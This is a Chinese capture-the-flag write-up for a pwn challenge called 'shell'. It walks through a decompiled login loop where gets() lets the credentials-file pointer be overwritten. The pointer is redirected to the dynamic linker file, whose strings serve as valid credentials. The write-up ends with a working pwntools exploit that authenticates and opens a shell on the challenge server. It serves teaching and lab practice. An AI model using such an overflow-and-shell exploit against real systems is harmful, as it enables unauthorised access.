# shell

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=f731d3ab-76f9-41de-9a39-7b65c4568b30_2)

8级世界的一股清流。

-   Arch:     amd64-64-little
    <br>RELRO:    No RELRO
    <br>Stack:    Canary found
    <br>NX:       NX enabled
    <br>PIE:      No PIE (0x400000)

看main，发现题目的难度不能单纯靠checksec来推断。

```c
void main(undefined4 param_1,undefined8 param_2)

{
  int iVar1;
  char *__s2;
  char *__s2_00;
  long lVar2;
  size_t local_b0;
  __ssize_t local_a8;
  char *local_a0;
  FILE *local_98;
  char local_89;
  int local_88;
  char acStack132 [32];
  char acStack100 [32];
  char acStack68 [36];
  char *local_20;
  undefined8 local_18;
  undefined4 local_10;
  undefined4 local_c;
  
  local_c = 0;
  local_20 = "creds.txt";
  local_88 = 0;
  local_18 = param_2;
  local_10 = param_1;
  setvbuf(stdout,(char *)0x0,2,0);
  local_89 = '$';
  do {
    while( true ) {
      printf("%c ",(ulong)(uint)(int)local_89);
      gets(acStack68);
      iVar1 = strcmp(acStack68,"login");
      if (iVar1 == 0) break;
      lVar2 = command_get(acStack68);
      if (lVar2 == 0) {
        puts("Command not found");
      }
      else if ((*(int *)(lVar2 + 0x10) == 1) && (local_88 != 1)) {
        puts("Permission denied");
      }
      else {
        (**(code **)(lVar2 + 8))();
      }
    }
    printf("Username: ");
    gets(acStack132);
    printf("Password: ");
    gets(acStack100);
    local_98 = fopen(local_20,"r");
    while( true ) {
      local_a0 = (char *)0x0;
      local_b0 = 0;
      local_a8 = getline(&local_a0,&local_b0,local_98);
      if (local_a8 < 0) break;
      local_a0[local_a8 + -1] = '\0';
      __s2 = strtok(local_a0,":");
      __s2_00 = strtok((char *)0x0,":");
      if ((((__s2 != (char *)0x0) && (__s2_00 != (char *)0x0)) &&
          (iVar1 = strcmp(acStack132,__s2), iVar1 == 0)) &&
         (iVar1 = strcmp(acStack100,__s2_00), iVar1 == 0)) {
        puts("Authenticated!");
        local_89 = '#';
        local_88 = 1;
        goto LAB_00400df8;
      }
      free(local_a0);
    }
    free(local_a0);
LAB_00400df8:
    if (local_88 != 1) {
      puts("Authentication failed!");
    }
    fclose(local_98);
  } while( true );
}
```

我自己运行了一下，像模像样的。然而漏洞也非常明显，gets无脑读入字符串，必定有栈溢出。rop好像不能用，一是canary，二是整个main都是无限循环，唯二退出的办法是ctrl+c或者自带的exit命令，这两种都无法很好的构造rop。继续在程序里看看，sh函数可以直接getshell，但是需要认证后才能使用。那看看这个判断怎么绕过。

[strtok](https://www.runoob.com/cprogramming/c-function-strtok.html)相当于python里的split，只不过效果有点奇怪，建议看刚刚的文档了解例子。[getline](https://blog.csdn.net/zqixiao_09/article/details/50253883)不是c库标准函数，不过也是有介绍的。

根据代码，local_98是文件local_20的内容，local_20为"creds.txt"，我们肯定不知道其中的内容。local_a0是local_98按照:做分割后得到的内容，__s2是:的前半部分，对应用户名；__s2_00是后半部分，对应密码。acStack132是我们输入的用户名，acStack100是我们输入的密码。输入的用户密码和文件内容一致即可通过验证。

分析完了，怎么绕过呢？相信大家早就想好方案了。gets读取的字符串可以覆盖到local_20，把local_20改为已知内容的文件名称就行了。可是，什么文件内容已知，而且在远程服务器上也有？附件给了我们libc，我们可以提前得知里面的内容，远程服务器上必定也有libc，路径为/lib64/ld-linux-x86-64.so.2。现在要干的就是找libc文件里有什么符合用户名:密码这种格式的字符串。

- strings ld-linux-x86-64.so.2 | grep ':'

找到很多啊，随便拿一个，记得溢出到指针然后把指针改为0x400200（程序内libc地址）。

```python
from pwn import *  
  
sh = remote('61.147.171.105',64909)  
  
#sh = process('./shell')  
sh.sendline('login')  
sh.sendlineafter('Username: ','sea')  
#溢出栈覆盖filename，使得程序读取/lib64/ld-linux-x86-64.so.2文件中的内容  
payload = b'a'*0x44 + p64(0x400200)  
sh.sendlineafter('Password: ',payload)  
  
sh.sendlineafter('Authentication failed!','login')  
sh.sendlineafter('Username: ','relocation processing')  
sh.sendlineafter('Password: ',' %s%s')  
  
sh.sendlineafter('Authenticated!','sh')  
  
  
sh.interactive()  
```